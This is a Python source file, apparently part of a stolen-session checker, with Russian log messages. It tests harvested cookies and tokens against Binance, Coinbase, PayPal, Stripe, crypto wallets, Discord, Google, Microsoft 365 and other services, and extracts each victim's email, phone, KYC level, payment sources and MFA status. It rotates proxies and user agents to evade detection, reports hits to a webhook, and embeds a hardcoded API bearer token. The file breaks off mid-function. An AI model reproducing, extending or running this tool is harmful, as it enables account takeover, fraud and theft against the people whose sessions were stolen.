# checkers.py — by Qwixx

import re
import time
import json
import random
import threading
from urllib.parse import urlparse
from collections import defaultdict

import requests

from utils import log, log_result
import proxy_checker

TIMEOUT = 15
MAX_RETRIES = 2
DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              "AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/120.0.0.0 Safari/537.36")

TW_BEARER = ("AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs"
             "%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA")

PROXY = None
UA_POOL = [DEFAULT_UA]
ROTATE_UA = False
PROXIES = []
ROTATE_PROXY = False
RATE_LIMITS = {"default": 5}
PROXY_CHECK_ON_START = True
PROXY_CHECK_WORKERS = 10

_session = requests.Session()
_session.headers.update({"User-Agent": DEFAULT_UA})

_rl_lock = threading.Lock()
_rl_next_ok = defaultdict(float)
_rl_interval = defaultdict(float)

_proxy_lock = threading.Lock()
_proxy_index = 0

_webhook_mgr = None
_webhook_lock = threading.Lock()


def configure(cfg):
    global TIMEOUT, MAX_RETRIES, PROXY, DEFAULT_UA
    global UA_POOL, ROTATE_UA, PROXIES, ROTATE_PROXY, RATE_LIMITS
    global PROXY_CHECK_ON_START, PROXY_CHECK_WORKERS

    if cfg.get("timeout"):
        try:
            TIMEOUT = int(cfg["timeout"])
        except (TypeError, ValueError):
            pass

    if cfg.get("max_retries") is not None:
        try:
            MAX_RETRIES = int(cfg["max_retries"])
        except (TypeError, ValueError):
            pass

    if cfg.get("proxy"):
        PROXY = cfg["proxy"]

    if cfg.get("user_agent"):
        DEFAULT_UA = cfg["user_agent"]
        _session.headers.update({"User-Agent": DEFAULT_UA})

    if cfg.get("user_agents"):
        UA_POOL = list(cfg["user_agents"]) or [DEFAULT_UA]

    ROTATE_UA = bool(cfg.get("rotate_ua", False))

    if cfg.get("proxies"):
        PROXIES = list(cfg["proxies"])
    ROTATE_PROXY = bool(cfg.get("rotate_proxy", False)) and bool(PROXIES)

    PROXY_CHECK_ON_START = bool(cfg.get("proxy_check_on_start", True))
    PROXY_CHECK_WORKERS = int(cfg.get("proxy_check_workers", 10) or 10)

    rl = cfg.get("rate_limit") or {}
    limits = dict(rl) if isinstance(rl, dict) else {}
    limits.setdefault("default", 5)
    RATE_LIMITS = limits
    _rebuild_rl_intervals()

    if ROTATE_PROXY and PROXY_CHECK_ON_START:
        _filter_proxies()


def _filter_proxies():
    global PROXIES, ROTATE_PROXY
    alive = proxy_checker.filter_alive(
        PROXIES,
        workers=PROXY_CHECK_WORKERS,
        timeout=min(TIMEOUT, 10),
    )
    PROXIES = alive
    ROTATE_PROXY = bool(alive)
    if not alive:
        log.warning("все прокси мертвы — работаем без них")


def _rebuild_rl_intervals():
    with _rl_lock:
        _rl_interval.clear()
        _rl_next_ok.clear()
        for host, qps in RATE_LIMITS.items():
            try:
                qps = float(qps)
            except (TypeError, ValueError):
                continue
            if qps <= 0:
                continue
            _rl_interval[host] = 1.0 / qps


def set_webhook_manager(mgr):
    global _webhook_mgr
    with _webhook_lock:
        _webhook_mgr = mgr
    if mgr is not None:
        try:
            mgr.start()
        except Exception as e:
            log.warning(f"webhook start fail: {e}")


def _notify_webhook(service, info, raw):
    mgr = _webhook_mgr
    if mgr is None or not getattr(mgr, "enabled", lambda: False)():
        return
    try:
        mgr.notify(service, info, raw)
    except Exception as e:
        log.warning(f"webhook notify fail: {e}")


def _next_proxy():
    global _proxy_index
    if not ROTATE_PROXY or not PROXIES:
        return PROXY
    with _proxy_lock:
        p = PROXIES[_proxy_index % len(PROXIES)]
        _proxy_index += 1
        return p


def _pick_ua():
    if ROTATE_UA and UA_POOL:
        return random.choice(UA_POOL)
    return DEFAULT_UA


def _host_of(url):
    try:
        return urlparse(url).hostname or ""
    except Exception:
        return ""


def _rate_limit_wait(url):
    host = _host_of(url)
    if not host:
        return
    with _rl_lock:
        interval = _rl_interval.get(host)
        if interval is None:
            qps = RATE_LIMITS.get(host, RATE_LIMITS.get("default"))
            try:
                qps = float(qps)
                interval = 1.0 / qps if qps > 0 else 0.0
            except (TypeError, ValueError):
                interval = 0.0
            _rl_interval[host] = interval
        if interval <= 0:
            return
        now = time.monotonic()
        next_ok = _rl_next_ok.get(host, 0.0)
        wait = next_ok - now
        _rl_next_ok[host] = max(now, next_ok) + interval
    if wait > 0:
        time.sleep(wait)


def _headers(extra=None):
    h = {
        "User-Agent": _pick_ua(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
    }
    if extra:
        h.update(extra)
    return h


def _request_with_backoff(url, **kwargs):
    last_exc = None
    r = None

    for attempt in range(MAX_RETRIES + 1):
        _rate_limit_wait(url)

        proxy = _next_proxy()
        if proxy is not None:
            kwargs["proxies"] = proxy

        hdrs = kwargs.get("headers")
        if isinstance(hdrs, dict) and ROTATE_UA:
            hdrs["User-Agent"] = _pick_ua()

        try:
            r = _session.get(url, **kwargs)
        except requests.exceptions.RequestException as e:
            last_exc = e
            log.debug(f"GET fail ({type(e).__name__}) {url} — "
                      f"attempt {attempt + 1}")
            if attempt < MAX_RETRIES:
                time.sleep(0.6 * (attempt + 1))
                continue
            raise

        if r.status_code == 429 and attempt < MAX_RETRIES:
            ra = r.headers.get("Retry-After", "")
            try:
                wait = min(int(ra), 10) if ra else 2
            except ValueError:
                wait = 2
            log.debug(f"429 {url} — ждём {wait}s")
            time.sleep(wait)
            continue

        if r.status_code in (502, 503, 504) and attempt < MAX_RETRIES:
            log.debug(f"{r.status_code} {url} — ретрай")
            time.sleep(1.0 * (attempt + 1))
            continue

        return r

    if last_exc:
        raise last_exc
    return r


def _get(url, **kwargs):
    kwargs.setdefault("timeout", TIMEOUT)
    kwargs.setdefault("headers", _headers())
    return _request_with_backoff(url, **kwargs)


def _is_cloudflare(r):
    server = (r.headers.get("Server") or "").lower()
    if "cloudflare" in server and r.status_code in (403, 503):
        return True
    if "cf-ray" in r.headers and r.status_code in (403, 503):
        return True
    return False


def _err(msg, code="invalid"):
    return {"valid": False, "error": msg, "code": code}


def _classify_status(r):
    if _is_cloudflare(r):
        return _err("Cloudflare challenge", code="cf")
    if r.status_code == 429:
        return _err("Rate limited (429)", code="rate_limit")
    return None


def _net_err(e, service):
    return _err(f"{service} network error: {e}", code="network")


def _sanitize_info(info):
    if info is None:
        return None
    if not isinstance(info, dict):
        return {"valid": False, "error": "Invalid checker output",
                "code": "parse"}

    out = {}
    for k, v in info.items():
        if k == "valid":
            out["valid"] = bool(v)
            continue
        if v is None:
            out[k] = "—"
            continue
        if isinstance(v, (dict, list, tuple, set)):
            try:
                out[k] = json.dumps(v, ensure_ascii=False)[:300]
            except Exception:
                out[k] = str(v)[:300]
            continue
        if isinstance(v, bool):
            out[k] = v
            continue
        if isinstance(v, (int, float)):
            out[k] = v
            continue
        s = str(v)
        out[k] = s[:300] if len(s) > 300 else s

    out.setdefault("valid", False)
    return out


def _safe_json(r):
    try:
        return r.json()
    except Exception:
        return None


def _html_meta(html, name):
    m = re.search(
        rf'<meta[^>]+name=["\']{re.escape(name)}["\'][^>]+content=["\']([^"\']+)',
        html, re.IGNORECASE)
    return m.group(1) if m else "—"


# ─────────────────────────────────────────────────────────────
# ЧЕКЕРЫ
# ─────────────────────────────────────────────────────────────

def check_binance(jar):
    p20t = jar.get("p20t", "")
    if not p20t:
        return _err("No p20t")
    ck = {k: v for k, v in jar.items()
          if k in ("p20t", "cr00", "BNC_FV", "bnc-uuid", "logined")}
    headers = _headers({
        "Accept": "application/json",
        "clienttype": "web",
        "lang": "en",
        "Origin": "https://www.binance.com",
        "Referer": "https://www.binance.com/en/my/wallet/account/main",
    })
    try:
        r = _get("https://www.binance.com/bapi/accounts/v1/private/account/"
                 "user/accountInfo",
                 headers=headers, cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code in (401, 403):
            return _err("Invalid p20t")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        if not data.get("success"):
            return _err("Not authorized")
        d = data.get("data") or {}
        return {
            "valid": True, "service": "Binance",
            "user_id": d.get("userId", "—"),
            "email": d.get("email", "—") or "—",
            "phone": d.get("mobile", "—") or "—",
            "kyc": d.get("kycLevel", "—"),
            "vip_level": d.get("vipLevel", "—"),
            "country": d.get("countryCode", "—"),
            "profile_url": "https://www.binance.com/en/my/wallet/account/main",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Binance")
    except Exception as e:
        return _err(f"Binance parse error: {e}", code="parse")


def check_coinbase(jar):
    cb_did = jar.get("cb_did", "")
    if not cb_did:
        return _err("No cb_did")
    ck = {k: v for k, v in jar.items()
          if k in ("cb_did", "__cf_bm", "coinbase_session", "_cb_sid")}
    headers = _headers({
        "Accept": "application/json",
        "Origin": "https://www.coinbase.com",
        "Referer": "https://www.coinbase.com/dashboard",
    })
    try:
        r = _get("https://www.coinbase.com/api/v2/users",
                 headers=headers, cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code in (401, 403):
            return _err("Invalid session")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        user = data.get("data") or data
        if not isinstance(user, dict) or not (user.get("id")
                                              or user.get("email")):
            return _err("Not authorized")
        return {
            "valid": True, "service": "Coinbase",
            "id": user.get("id", "—"),
            "email": user.get("email", "—") or "—",
            "name": user.get("name", "—") or "—",
            "country": user.get("country", "—") or "—",
            "native_currency": user.get("native_currency", "—"),
            "profile_url": "https://www.coinbase.com/dashboard",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Coinbase")
    except Exception as e:
        return _err(f"Coinbase parse error: {e}", code="parse")


def check_paypal(jar):
    xpps = jar.get("x-pp-s", "")
    if not xpps:
        return _err("No x-pp-s")
    ck = {k: v for k, v in jar.items()
          if k in ("x-pp-s", "cookie_check", "nsid", "AKDC", "ts",
                   "_paypal_session")}
    try:
        r = _get("https://www.paypal.com/myaccount/home",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://www.paypal.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "signin" in r.url.lower():
            return _err("Not authorized")
        html = r.text
        name = "—"
        for pat in (r'"userName"\s*:\s*"([^"]+)"',
                    r'"firstName"\s*:\s*"([^"]+)"',
                    r'<title[^>]*>(.*?)</title>'):
            m = re.search(pat, html, re.DOTALL)
            if m:
                name = re.sub(r"\s+", " ", m.group(1)).strip()
                if name and name.lower() not in ("paypal", "log in"):
                    break
        email = "—"
        m = re.search(r'"email"\s*:\s*"([^"]+)"', html)
        if m:
            email = m.group(1)
        return {
            "valid": True, "service": "PayPal",
            "name": name, "email": email,
            "profile_url": "https://www.paypal.com/myaccount/home",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "PayPal")
    except Exception as e:
        return _err(f"PayPal parse error: {e}", code="parse")


def check_stripe(jar):
    mach = jar.get("private_machine_identifier", "")
    site = jar.get("site-auth", "")
    if not mach and not site:
        return _err("No Stripe cookies")
    ck = {k: v for k, v in jar.items()
          if k in ("private_machine_identifier", "site-auth", "stripe.csrf",
                   "__stripe_mid", "__stripe_sid")}
    try:
        r = _get("https://dashboard.stripe.com/settings/user",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://dashboard.stripe.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "/login" in r.url.lower():
            return _err("Not authorized")
        html = r.text
        email = "—"
        m = re.search(r'"email"\s*:\s*"([^"]+)"', html)
        if m:
            email = m.group(1)
        name = "—"
        m = re.search(r'"name"\s*:\s*"([^"]+)"', html)
        if m:
            name = m.group(1)
        return {
            "valid": True, "service": "Stripe",
            "name": name, "email": email,
            "profile_url": "https://dashboard.stripe.com/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Stripe")
    except Exception as e:
        return _err(f"Stripe parse error: {e}", code="parse")


def check_metamask(jar):
    sess = jar.get("metamask_session", "") or jar.get("metamask_user", "")
    if not sess:
        return _err("No MetaMask session")
    ck = {k: v for k, v in jar.items()
          if k in ("metamask_session", "metamask_user", "metamask_wallet",
                   "mm_session")}
    try:
        r = _get("https://portfolio.metamask.io/",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://metamask.io/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        return {
            "valid": True, "service": "MetaMask",
            "session": "active",
            "profile_url": "https://portfolio.metamask.io/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "MetaMask")
    except Exception as e:
        return _err(f"MetaMask parse error: {e}", code="parse")


def check_trustwallet(jar):
    sess = (jar.get("trustwallet_session") or jar.get("tw_session") or "")
    if not sess:
        return _err("No Trust Wallet session")
    ck = {k: v for k, v in jar.items()
          if k in ("trustwallet_session", "tw_session", "trust_wallet",
                   "tw_uid")}
    try:
        r = _get("https://trustwallet.com/",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://trustwallet.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        return {
            "valid": True, "service": "Trust Wallet",
            "session": "active",
            "profile_url": "https://trustwallet.com/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Trust Wallet")
    except Exception as e:
        return _err(f"Trust Wallet parse error: {e}", code="parse")


def check_opensea(jar):
    sess = jar.get("opensea_session", "") or jar.get("os_session", "")
    if not sess:
        return _err("No OpenSea session")
    ck = {k: v for k, v in jar.items()
          if k in ("opensea_session", "os_session", "os_profile",
                   "opensea_wallet")}
    try:
        r = _get("https://opensea.io/account",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://opensea.io/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "/login" in r.url.lower():
            return _err("Not authorized")
        html = r.text
        username = "—"
        m = re.search(r'"username"\s*:\s*"([^"]+)"', html)
        if m:
            username = m.group(1)
        return {
            "valid": True, "service": "OpenSea",
            "username": username,
            "profile_url": "https://opensea.io/account",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "OpenSea")
    except Exception as e:
        return _err(f"OpenSea parse error: {e}", code="parse")


def check_telegram(jar):
    ssid = jar.get("stel_ssid", "") or jar.get("stel_token", "")
    if not ssid:
        return _err("No stel_ssid/stel_token")
    ck = {k: v for k, v in jar.items() if k.startswith("stel_")}
    try:
        r = _get("https://web.telegram.org/a/",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://web.telegram.org/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        return {
            "valid": True, "service": "Telegram (Web)",
            "session": "active",
            "profile_url": "https://web.telegram.org/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Telegram")
    except Exception as e:
        return _err(f"Telegram parse error: {e}", code="parse")


def check_instagram(jar):
    session = jar.get("sessionid", "")
    if not session:
        return _err("No sessionid")
    uid = jar.get("ds_user_id", "")
    if not uid.isdigit():
        return _err("No ds_user_id")
    ck = {k: v for k, v in jar.items()
          if k in ("sessionid", "ds_user_id", "csrftoken", "mid", "rur",
                   "ig_did", "ig_nrcb", "shbid", "shbts")}
    url = f"https://i.instagram.com/api/v1/users/{uid}/info/"
    try:
        r = _get(url,
                 headers=_headers({
                     "X-IG-App-ID": "936619743392459",
                     "Accept": "*/*",
                     "Referer": "https://www.instagram.com/",
                 }),
                 cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code in (401, 403):
            return _err("Invalid session")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        user = data.get("user") if isinstance(data, dict) else None
        if not user:
            return _err("Not authorized")
        return {
            "valid": True, "service": "Instagram",
            "id": user.get("pk") or uid,
            "username": user.get("username", "—"),
            "full_name": user.get("full_name", "—") or "—",
            "email": user.get("email", "—") or "—",
            "phone": user.get("phone_number", "—") or "—",
            "followers": (user.get("follower_count")
                          if user.get("follower_count") is not None
                          else "—"),
            "following": (user.get("following_count")
                          if user.get("following_count") is not None
                          else "—"),
            "posts": (user.get("media_count")
                      if user.get("media_count") is not None
                      else "—"),
            "verified": "YES" if user.get("is_verified") else "no",
            "private": "YES" if user.get("is_private") else "no",
            "business": "YES" if user.get("is_business") else "no",
            "profile_url": (f"https://www.instagram.com/"
                            f"{user.get('username', '')}/"),
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Instagram")
    except Exception as e:
        return _err(f"Instagram parse error: {e}", code="parse")


def check_facebook(jar):
    c_user = jar.get("c_user", "")
    xs = jar.get("xs", "")
    if not c_user or not xs:
        return _err("No c_user/xs")
    ck = {k: v for k, v in jar.items()
          if k in ("c_user", "xs", "fr", "datr", "sb", "presence",
                   "wd", "dpr")}
    try:
        r = _get("https://mbasic.facebook.com/profile.php",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://mbasic.facebook.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        html = r.text
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "/login" in r.url.lower():
            return _err("Not authorized")
        if ('name="email"' in html[:8000]
                and 'name="pass"' in html[:8000]):
            return _err("Not authorized (login form)")
        name = "—"
        for pat in (r'<title[^>]*>(.*?)</title>',
                    r'<strong[^>]*>([^<]+)</strong>'):
            m = re.search(pat, html, re.DOTALL)
            if m:
                name = re.sub(r"\s+", " ", m.group(1)).strip()
                if name and name.lower() not in ("facebook", "log in"):
                    break
        return {
            "valid": True, "service": "Facebook",
            "user_id": c_user, "name": name,
            "profile_url": f"https://www.facebook.com/profile.php?id={c_user}",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Facebook")
    except Exception as e:
        return _err(f"Facebook parse error: {e}", code="parse")


def check_vk(jar):
    remixsid = jar.get("remixsid", "")
    if not remixsid:
        return _err("No remixsid")
    ck = {"remixsid": remixsid}
    try:
        r = _get("https://vk.com/feed",
                 headers=_headers({"Accept": "text/html"}),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        html = r.text
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "login" in r.url.lower() and "act=login" in r.url.lower():
            return _err("Not authorized")
        if ('<form' in html and 'name="email"' in html
                and 'name="pass"' in html):
            return _err("Not authorized (login form)")
        user_id = "—"
        for pat in (r'"user_id":(\d+)', r'"uid":(\d+)',
                    r'id="profile_redesigned_(\d+)"', r'"peer_id":(\d+)'):
            m = re.search(pat, html)
            if m:
                user_id = m.group(1)
                break
        name = "—"
        for pat in (r"<title>(.*?)</title>",
                    r'<h1[^>]*class="page_name"[^>]*>(.*?)</h1>',
                    r'"name":"([^"]+)"'):
            m = re.search(pat, html, re.DOTALL)
            if m:
                name = re.sub(r"\s+", " ", m.group(1)).strip()
                break
        if user_id != "—":
            try:
                rp = _get(f"https://vk.com/id{user_id}",
                          headers=_headers({"Accept": "text/html"}),
                          cookies=ck)
                if rp.status_code == 200:
                    m2 = re.search(r'<title>(.*?)</title>', rp.text,
                                   re.DOTALL)
                    if m2:
                        name = re.sub(r"\s+", " ", m2.group(1)).strip()
            except Exception:
                pass
        return {
            "valid": True, "service": "VK",
            "user_id": user_id, "name": name,
            "profile_url": (f"https://vk.com/id{user_id}"
                            if user_id != "—" else "—"),
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "VK")
    except Exception as e:
        return _err(f"VK parse error: {e}", code="parse")


def check_whatsapp(jar):
    init = (jar.get("wa_web_initial_version", "")
            or jar.get("wa_csrf", ""))
    if not init:
        return _err("No WhatsApp Web cookies")
    ck = {k: v for k, v in jar.items() if k.startswith("wa_")}
    try:
        r = _get("https://web.whatsapp.com/",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://web.whatsapp.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        return {
            "valid": True, "service": "WhatsApp (Web)",
            "session": "active",
            "profile_url": "https://web.whatsapp.com/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "WhatsApp")
    except Exception as e:
        return _err(f"WhatsApp parse error: {e}", code="parse")


def check_discord(jar):
    token = jar.get("token") or jar.get("discord_token") or ""
    token = token.strip().strip('"').strip("'")
    if not token:
        return _err("No token")
    headers = _headers({
        "Authorization": token,
        "Accept": "application/json",
        "Referer": "https://discord.com/channels/@me",
    })
    try:
        r = _get("https://discord.com/api/v9/users/@me", headers=headers)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code == 401:
            return _err("Invalid token")
        if r.status_code == 403:
            return _err("Token forbidden (locked?)")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        uid = data.get("id", "—")
        username = data.get("username", "—")
        discrim = data.get("discriminator", "0")
        tag = (f"{username}#{discrim}"
               if discrim and discrim != "0" else username)
        guilds_count = "—"
        try:
            rg = _get("https://discord.com/api/v9/users/@me/guilds",
                      headers=headers)
            if rg.status_code == 200:
                arr = rg.json()
                if isinstance(arr, list):
                    guilds_count = len(arr)
        except Exception:
            pass
        billing = "—"
        try:
            rb = _get("https://discord.com/api/v9/users/@me/billing/"
                      "payment-sources", headers=headers)
            if rb.status_code == 200:
                arr = rb.json()
                if isinstance(arr, list):
                    billing = len(arr)
        except Exception:
            pass
        nitro = "—"
        try:
            rn = _get("https://discord.com/api/v9/users/@me/billing/"
                      "subscriptions", headers=headers)
            if rn.status_code == 200:
                arr = rn.json()
                nitro = "YES" if isinstance(arr, list) and arr else "no"
        except Exception:
            pass
        return {
            "valid": True, "service": "Discord",
            "id": uid, "username": tag,
            "email": data.get("email", "—") or "—",
            "phone": data.get("phone", "—") or "—",
            "verified": "YES" if data.get("verified") else "no",
            "mfa": "YES" if data.get("mfa_enabled") else "no",
            "locale": data.get("locale", "—"),
            "guilds": guilds_count,
            "payment_sources": billing,
            "nitro": nitro,
            "avatar_url": (f"https://cdn.discordapp.com/avatars/"
                           f"{uid}/{data.get('avatar')}.png"
                           if data.get("avatar") else "—"),
            "profile_url": f"https://discord.com/users/{uid}",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Discord")
    except Exception as e:
        return _err(f"Discord parse error: {e}", code="parse")


def check_google(jar):
    sid = jar.get("SID", "")
    hsid = jar.get("HSID", "")
    ssid = jar.get("SSID", "")
    if not (sid and hsid and ssid):
        return _err("No Google session cookies")
    ck = {k: v for k, v in jar.items()
          if k in ("SID", "HSID", "SSID", "APISID", "SAPISID",
                   "__Secure-1PSID", "__Secure-3PSID", "SIDCC")}
    try:
        r = _get("https://myaccount.google.com/",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://www.google.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "accounts.google.com" in r.url and "signin" in r.url:
            return _err("Not authorized")
        html = r.text
        email = "—"
        for pat in (r'"email"\s*:\s*"([^"]+@[^"]+)"',
                    r'([\w.+-]+@gmail\.com)',
                    r'([\w.+-]+@[\w.-]+\.\w+)'):
            m = re.search(pat, html)
            if m:
                email = m.group(1)
                break
        name = "—"
        m = re.search(r'"displayName"\s*:\s*"([^"]+)"', html)
        if m:
            name = m.group(1)
        return {
            "valid": True, "service": "Google Workspace",
            "email": email, "name": name,
            "profile_url": "https://myaccount.google.com/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Google")
    except Exception as e:
        return _err(f"Google parse error: {e}", code="parse")


def check_microsoft365(jar):
    auth = jar.get("__Host-MSAAUTHP", "") or jar.get("MSPAuth", "")
    if not auth:
        return _err("No Microsoft auth cookies")
    ck = {k: v for k, v in jar.items()
          if k in ("__Host-MSAAUTHP", "MSPAuth", "RPSSecAuth", "MSPRequ",
                   "MSPOK", "MSPProf")}
    try:
        r = _get("https://www.office.com/",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://www.office.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "login.microsoftonline" in r.url or "login.live.com" in r.url:
            return _err("Not authorized")
        html = r.text
        email = "—"
        m = re.search(r'([\w.+-]+@[\w.-]+\.\w+)', html)
        if m:
            email = m.group(1)
        name = "—"
        m = re.search(r'"displayName"\s*:\s*"([^"]+)"', html)
        if m:
            name = m.group(1)
        return {
            "valid": True, "service": "Microsoft 365",
            "email": email, "name": name,
            "profile_url": "https://www.office.com/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Microsoft 365")
    except Exception as e:
        return _err(f"Microsoft 365 parse error: {e}", code="parse")


def check_slack(jar):
    ds = jar.get("d-s", "")
    if not ds:
        return _err("No d-s cookie")
    ck = {k: v for k, v in jar.items() if k in ("d-s", "b", "d")}
    try:
        r = _get("https://app.slack.com/client",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://app.slack.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "signin" in r.url.lower() or "/login" in r.url.lower():
            return _err("Not authorized")
        html = r.text
        team = "—"
        m = re.search(r'"team_name"\s*:\s*"([^"]+)"', html)
        if m:
            team = m.group(1)
        return {
            "valid": True, "service": "Slack",
            "team": team,
            "profile_url": "https://app.slack.com/client",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Slack")
    except Exception as e:
        return _err(f"Slack parse error: {e}", code="parse")


def check_jira(jar):
    sess = (jar.get("cloud.session.token", "")
            or jar.get("atlassian.xsrf.token", ""))
    if not sess:
        return _err("No Jira session cookie")
    ck = {k: v for k, v in jar.items()
          if k in ("cloud.session.token", "atlassian.xsrf.token",
                   "JSESSIONID", "seraph.rememberme.cookie",
                   "studio.crowd.tokenkey")}
    try:
        r = _get("https://id.atlassian.com/manage-profile/profile",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://www.atlassian.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "/login" in r.url.lower():
            return _err("Not authorized")
        html = r.text
        email = "—"
        m = re.search(r'([\w.+-]+@[\w.-]+\.\w+)', html)
        if m:
            email = m.group(1)
        return {
            "valid": True, "service": "Jira",
            "email": email,
            "profile_url": "https://id.atlassian.com/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Jira")
    except Exception as e:
        return _err(f"Jira parse error: {e}", code="parse")


def check_notion(jar):
    tv2 = jar.get("token_v2", "")
    if not tv2:
        return _err("No token_v2")
    ck = {k: v for k, v in jar.items()
          if k in ("token_v2", "notion_user_id", "notion_browser_id",
                   "notion_check_cookie")}
    try:
        r = _get("https://www.notion.so/api/v3/getSpaces",
                 headers=_headers({
                     "Accept": "application/json",
                     "Content-Type": "application/json",
                     "Referer": "https://www.notion.so/",
                 }),
                 cookies=ck)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code in (401, 403):
            return _err("Invalid session")
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        data = _safe_json(r) or {}
        if not data:
            return _err("Not authorized")
        email = "—"
        name = "—"
        try:
            for uid, u in data.items():
                nv = (u.get("value") or {})
                email = nv.get("email") or email
                name = nv.get("name") or name
                if email != "—":
                    break
        except Exception:
            pass
        return {
            "valid": True, "service": "Notion",
            "email": email, "name": name,
            "profile_url": "https://www.notion.so/",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Notion")
    except Exception as e:
        return _err(f"Notion parse error: {e}", code="parse")


def check_dropbox(jar):
    jar_cookie = jar.get("jar", "")
    if not jar_cookie:
        return _err("No jar")
    ck = {k: v for k, v in jar.items()
          if k in ("jar", "t", "__Host-js_csrf", "dropbox_uid")}
    try:
        r = _get("https://www.dropbox.com/home",
                 headers=_headers({
                     "Accept": "text/html",
                     "Referer": "https://www.dropbox.com/",
                 }),
                 cookies=ck, allow_redirects=True)
        if (cf := _classify_status(r)):
            return cf
        if r.status_code != 200:
            return _err(f"HTTP {r.status_code}")
        if "/login" in r.url.lower():
            return _err("Not authorized")
        html = r.text
        name = "—"
        m = re.search(r'"displayName"\s*:\s*"([^"]+)"', html)
        if m:
            name = m.group(1)
        email = "—"
        m = re.search(r'"email"\s*:\s*"([^"]+)"', html)
        if m:
            email = m.group(1)
        return {
            "valid": True, "service": "Dropbox",
            "name": name, "email": email,
            "profile_url": "https://www.dropbox.com/home",
        }
    except requests.exceptions.RequestException as e:
        return _net_err(e, "Dropbox")
    except Exception as e:
        return _err(f"Dropbox parse error: {e}", code="parse")


def check_github(jar):
    session = jar.get("user_session", "")
    if not session:
        return _err("No user_session")
    ck = {k: v for k, v in jar.items()
          if k in ("user_session", "logged_in", "_gh_sess", "dotcom_user",
                   "preferred_color_mode", "tz")}
    try:
        r = _get("https://github.com/",
